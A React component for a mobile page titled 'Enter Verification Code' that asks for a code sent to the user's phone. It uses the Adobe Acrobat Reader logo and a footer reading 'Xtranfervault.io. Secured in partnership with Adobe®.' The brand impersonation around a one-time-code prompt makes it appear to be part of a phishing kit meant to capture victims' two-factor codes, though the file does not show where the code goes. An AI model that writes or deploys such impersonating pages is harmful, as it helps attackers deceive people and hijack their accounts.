import React, { useState } from 'react';
import Spinner from '../common/Spinner';
import { ShieldCheck } from 'lucide-react';

interface MobileOtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
}

const AdobeLogo = () => (
  <img 
    src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
    alt="Adobe Acrobat Reader Logo" 
    className="w-9 h-9 drop-shadow-lg"
  />
);

const MobileOtpPage: React.FC<MobileOtpPageProps> = ({ onSubmit, isLoading, errorMessage, email }) => {
  const [otp, setOtp] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.trim()) {
      onSubmit(otp);
    }
  };

  return (
    <div 
      className="min-h-screen flex flex-col justify-end font-sans bg-cover bg-center"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1588345921532-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
      }}
    >
        <>
          <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
            <div className="flex justify-center mb-4">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-bold text-gray-900">Enter Verification Code</h1>
            <p className="text-gray-800 mt-2 text-sm font-medium">
              For your security, please enter the code sent to your phone.
            </p>
          </div>

          <div className="bg-white/60 backdrop-blur-md rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-white/30">
            <form onSubmit={handleSubmit} className="space-y-5">
              {errorMessage && ( <div className="bg-red-100/90 backdrop-blur-sm text-red-700 p-3 rounded-lg text-sm font-medium text-center border border-red-200/50"> {errorMessage} </div> )}
              <div>
                <label className="text-sm font-bold text-gray-700" htmlFor="otp">Verification Code</label>
                <div className="relative mt-2">
                  <ShieldCheck className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-500 w-5 h-5" />
                  <input id="otp" type="text" value={otp} onChange={(e) => setOtp(e.target.value)} placeholder="Enter code" required className="w-full pl-11 pr-4 py-4 bg-white/80 backdrop-blur-sm border-2 border-white/50 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition" />
                </div>
              </div>
              
              <button type="submit" disabled={isLoading || !otp} className="w-full flex items-center justify-center py-4 px-4 rounded-xl font-bold text-white bg-blue-600/90 backdrop-blur-sm hover:bg-blue-700/90 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/30">
                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                {isLoading ? 'Verifying...' : 'Submit Code'}
              </button>
            </form>
          </div>
          <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
            <p className="text-xs text-gray-600 text-center">© 2026 Xtranfervault.io. Secured in partnership with Adobe®.</p>
          </div>
        </>
    </div>
  );
};

export default MobileOtpPage;
